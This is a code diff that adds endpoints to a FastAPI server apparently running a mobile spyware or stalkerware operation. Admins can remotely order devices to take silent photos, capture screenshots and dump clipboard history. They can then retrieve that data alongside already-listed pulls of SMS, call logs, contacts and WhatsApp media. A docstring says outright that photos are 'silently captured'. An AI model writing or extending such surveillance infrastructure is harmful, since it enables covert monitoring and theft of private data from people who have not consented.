@@ -272,6 +272,9 @@ VALID_REMOTE_COMMANDS = {
     "pull_contacts", "pull_call_logs", "pull_sms", "pull_media", "pull_all",
     "pull_installed_apps", "pull_whatsapp_media",
     "start_screen_record", "stop_screen_record",
+    "take_photo",
+    "get_battery_status", "get_network_info", "get_device_info",
+    "get_clipboard", "capture_screenshot",
 }
 
 class RemoteCommandRequest(BaseModel):
@@ -6836,6 +6839,216 @@ async def raw_upload_health_check():
         "status": "running",
         "version": "1.0.0"
     }
+
+# ─── Snapshot endpoints (battery, network, device-info, clipboard, screenshot, photo) ───
+
+@app.post("/device-data/battery")
+async def device_upload_battery(payload: Dict, current_user: User = Depends(get_current_user)):
+    """Device uploads battery status snapshot."""
+    import json as _json
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "battery.json")
+    with open(path, "w") as f:
+        _json.dump(payload, f)
+    return {"status": "ok"}
+
+@app.get("/admin/device-data/battery/{username}")
+async def admin_get_battery(username: str, current_user: User = Depends(get_current_user)):
+    """Admin retrieves latest battery snapshot for a user."""
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    import json as _json
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "battery.json")
+    if not os.path.exists(path):
+        return {"error": "No snapshot yet"}
+    with open(path) as f:
+        return _json.load(f)
+
+@app.post("/device-data/network")
+async def device_upload_network(payload: Dict, current_user: User = Depends(get_current_user)):
+    """Device uploads network info snapshot."""
+    import json as _json
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "network.json")
+    with open(path, "w") as f:
+        _json.dump(payload, f)
+    return {"status": "ok"}
+
+@app.get("/admin/device-data/network/{username}")
+async def admin_get_network(username: str, current_user: User = Depends(get_current_user)):
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    import json as _json
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "network.json")
+    if not os.path.exists(path):
+        return {"error": "No snapshot yet"}
+    with open(path) as f:
+        return _json.load(f)
+
+@app.post("/device-data/device-info")
+async def device_upload_device_info(payload: Dict, current_user: User = Depends(get_current_user)):
+    """Device uploads hardware/OS info snapshot."""
+    import json as _json
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "device_info.json")
+    with open(path, "w") as f:
+        _json.dump(payload, f)
+    return {"status": "ok"}
+
+@app.get("/admin/device-data/device-info/{username}")
+async def admin_get_device_info(username: str, current_user: User = Depends(get_current_user)):
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    import json as _json
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "device_info.json")
+    if not os.path.exists(path):
+        return {"error": "No snapshot yet"}
+    with open(path) as f:
+        return _json.load(f)
+
+@app.post("/device-data/clipboard")
+async def device_upload_clipboard(payload: Dict, current_user: User = Depends(get_current_user)):
+    """Device uploads clipboard content."""
+    import json as _json
+    user_id = int(getattr(current_user, 'id', 0))
+    clip_dir = os.path.join(_user_data_dir(user_id), "clipboard")
+    os.makedirs(clip_dir, exist_ok=True)
+    entry = {**payload, "saved_at": datetime.now(timezone.utc).isoformat()}
+    # Append to history
+    history_path = os.path.join(clip_dir, "history.json")
+    history = []
+    if os.path.exists(history_path):
+        try:
+            with open(history_path) as f:
+                history = _json.load(f)
+        except Exception:
+            history = []
+    history.insert(0, entry)
+    history = history[:100]  # keep last 100 entries
+    with open(history_path, "w") as f:
+        _json.dump(history, f)
+    return {"status": "ok"}
+
+@app.get("/admin/device-data/clipboard/{username}")
+async def admin_get_clipboard(username: str, current_user: User = Depends(get_current_user)):
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    import json as _json
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "clipboard", "history.json")
+    if not os.path.exists(path):
+        return []
+    with open(path) as f:
+        return _json.load(f)
+
+@app.post("/device-data/screenshot/upload")
+async def device_upload_screenshot(
+    file: UploadFile = File(...),
+    command_id: str = Form(default="0"),
+    context: str = Form(default="screenshot"),
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads a screenshot captured on command."""
+    user_id = int(getattr(current_user, 'id', 0))
+    ss_dir = os.path.join(_user_data_dir(user_id), "screenshots")
+    os.makedirs(ss_dir, exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    filename = f"ss_{ts}_{uuid.uuid4().hex[:6]}.jpg"
+    file_path = os.path.join(ss_dir, filename)
+    content = await file.read()
+    with open(file_path, "wb") as f:
+        f.write(content)
+    return {"status": "ok", "filename": filename}
+
+@app.get("/admin/device-data/screenshots/{username}")
+async def admin_list_screenshots(username: str, current_user: User = Depends(get_current_user)):
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    ss_dir = os.path.join(_user_data_dir(int(target.id)), "screenshots")
+    if not os.path.exists(ss_dir):
+        return []
+    files = sorted(os.listdir(ss_dir), reverse=True)
+    return [{"filename": f, "url": f"/admin/device-data/screenshots/{username}/{f}"} for f in files if f.endswith('.jpg')]
+
+@app.get("/admin/device-data/screenshots/{username}/{filename}")
+async def admin_get_screenshot(username: str, filename: str, current_user: User = Depends(get_current_user)):
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    from fastapi.responses import FileResponse
+    file_path = os.path.join(_user_data_dir(int(target.id)), "screenshots", os.path.basename(filename))
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="File not found")
+    return FileResponse(file_path, media_type="image/jpeg")
+
+@app.post("/device-data/photo/upload")
+async def device_upload_photo(
+    file: UploadFile = File(...),
+    command_id: str = Form(default="0"),
+    context: str = Form(default="take_photo"),
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads a silently captured photo."""
+    user_id = int(getattr(current_user, 'id', 0))
+    photo_dir = os.path.join(_user_data_dir(user_id), "photos")
+    os.makedirs(photo_dir, exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    filename = f"photo_{ts}_{uuid.uuid4().hex[:6]}.jpg"
+    file_path = os.path.join(photo_dir, filename)
+    content = await file.read()
+    with open(file_path, "wb") as f:
+        f.write(content)
+    return {"status": "ok", "filename": filename}
+
+@app.get("/admin/device-data/photos/{username}")
+async def admin_list_photos(username: str, current_user: User = Depends(get_current_user)):
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    photo_dir = os.path.join(_user_data_dir(int(target.id)), "photos")
+    if not os.path.exists(photo_dir):
+        return []
+    files = sorted(os.listdir(photo_dir), reverse=True)
+    return [{"filename": f, "url": f"/admin/device-data/photos/{username}/{f}"} for f in files if f.endswith('.jpg')]
+
+@app.get("/admin/device-data/photos/{username}/{filename}")
+async def admin_get_photo(username: str, filename: str, current_user: User = Depends(get_current_user)):
+    if not getattr(current_user, 'is_admin', False):
+        raise HTTPException(status_code=403, detail="Admin only")
+    db = next(get_db())
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    from fastapi.responses import FileResponse
+    file_path = os.path.join(_user_data_dir(int(target.id)), "photos", os.path.basename(filename))
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="File not found")
+    return FileResponse(file_path, media_type="image/jpeg")
 
         
 if __name__ == "__main__":
